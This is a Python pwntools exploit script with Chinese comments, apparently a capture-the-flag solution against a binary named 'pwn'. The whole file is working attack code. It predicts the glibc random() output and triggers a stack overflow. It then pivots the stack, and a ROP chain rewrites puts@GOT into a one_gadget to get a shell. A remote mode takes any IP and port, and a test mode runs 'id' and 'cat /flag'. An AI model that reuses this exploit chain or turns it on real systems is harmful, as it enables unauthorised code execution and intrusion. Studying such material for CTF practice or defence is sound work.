# -*- coding: UTF-8 -*-
# 用法:
#   python3 exploit.py            -> 交互式 shell (io.interactive)
#   python3 exploit.py test       -> 自动测试: getshell 后 cat /flag 并校验
#   python3 exploit.py remote IP PORT -> 打远程
from pwn import *
import sys

context.log_level = 'info'
context.arch = 'amd64'

MODE = 'interactive'
if len(sys.argv) >= 2 and sys.argv[1] == 'test':
    MODE = 'test'
elif len(sys.argv) >= 2 and sys.argv[1] == 'remote':
    MODE = 'remote'

if MODE == 'remote':
    io = remote(sys.argv[2], int(sys.argv[3]))
else:
    io = process('./pwn')
elf = ELF('./pwn', checksec=False)

# ---- pwntools helpers ----
ru  = lambda a,b=True : io.recvuntil(a,b)
sla = lambda a,b      : io.sendlineafter(a,b)
sn  = lambda x        : io.send(x)

# ---- gadget & 地址 ----
pop_rsi   = 0x40153d
pop_rdx   = 0x401543
pop_rbp   = 0x40125d
pop_rbx   = 0x401540
add_dp    = 0x40125c   # add dword ptr [rbp-0x3d], ebx ; nop ; ret
leave_ret = 0x4015e6
ret       = 0x4015e7
read_plt  = elf.plt['read']
puts_plt  = elf.plt['puts']
puts_got  = 0x404018

new_stack = 0x414000   

puts_off  = 0x80ef0
one_gadget= 0xeacf2   
delta     = (one_gadget - puts_off) & 0xffffffff

randnum = [0, 0]   # 占位 [0],[1], 真实数从 [2] 开始
def game_collect(idx):
    """连续输 idx 轮, 收集随机数"""
    for i in range(idx):
        sla(b"guess number?[y/n]", b'y')
        sla(b"guess[0]: ", b"\n")
        sla(b"guess[1]: ", b"\n")
        sla(b"guess[2]: ", b"\n")
        sla(b"guess[3]: ", b"\n")
        sla(b"guess[4]: ", b"\n")
        sla(b"guess number?[y/n]", b'6')   # 选 6 进入 Give Up 分支
        sla(b"Give Up? [y/n]", b'y')
        ru(b"the number is ")
        n = int(ru(b"\n"), 16)
        randnum.append(n)
        sla(b"continue guess? [y/n]", b'y')
    # o[i] = o[i-31] + o[i-3] (mod 2^31) + carry(0/1); 先算 mod 部分, carry 用双猜测覆盖
    randnum.append((randnum[2] + randnum[30]) & 0x7FFFFFFF)   # 预测 idx(=31) 之后的下一个

def win_and_overflow(pred, pay):
    """发 pred; 若 too small 再发 pred+1 覆盖 carry; 猜对后发送溢出 payload"""
    sla(b"guess[0]: ", str(pred).encode())
    data = io.recvuntil([b'you win!\n', b'guess[1]: '], timeout=15)
    if data.endswith(b'guess[1]: '):           # pred 偏小 (carry=1)
        io.sendline(str(pred + 1).encode())
        io.recvuntil(b'you win!\n', timeout=15)
    io.sendline(pay)

log.info("STAGE 1: 收集随机数 + 栈迁移到 0x%x", new_stack)
game_collect(31)
sla(b"guess number?[y/n]", b'y')

pay = b'a'*0x30 + p64(new_stack - 8)*3
pay += p64(pop_rsi) + p64(new_stack) + p64(read_plt) + p64(leave_ret)
win_and_overflow(randnum[33], pay)
log.success("STAGE 1 完成: 已发送迁移链")

sleep(0.5)
stage3 = b''
stage3 += p64(pop_rsi) + p64(0)              # rsi = 0  (one_gadget 约束)
stage3 += p64(pop_rdx) + p64(0)              # rdx = 0  (one_gadget 约束)
stage3 += p64(pop_rbx) + p64(delta)          # ebx = delta
stage3 += p64(pop_rbp) + p64(puts_got + 0x3d)# rbp = puts@got + 0x3d
stage3 += p64(add_dp)                        # add [puts@got], delta -> one_gadget
stage3 += p64(puts_plt)                      # jmp [puts@got] = one_gadget -> shell!
sn(stage3)
log.success("STAGE 3 完成: 已发送 one_gadget 触发链")
log.info("delta = %#x, one_gadget = %#x", delta, one_gadget)

sleep(0.5)
if MODE == 'test':
    import time
    def run_cmd(cmd):
        io.sendline(cmd.encode() if isinstance(cmd, str) else cmd)
        time.sleep(0.4)
        return io.recv(timeout=1)

    log.info("===== GETSHELL 验证 =====")
    out_id = run_cmd('id')
    log.info("id -> %s", out_id.decode(errors='replace').strip())
    out_flag = run_cmd('cat /flag')
    flag = out_flag.decode(errors='replace').strip()
    log.info("cat /flag -> %s", flag)
    try:
        run_cmd('exit')
    except EOFError:
        pass
    if flag.startswith('flag{') or 'flag{' in flag:
        log.success("🎉 拿到 flag: %s", flag)
    else:
        log.warning("未识别到 flag 格式, 原始输出: %r", out_flag)
    io.close()
else:
    io.interactive()
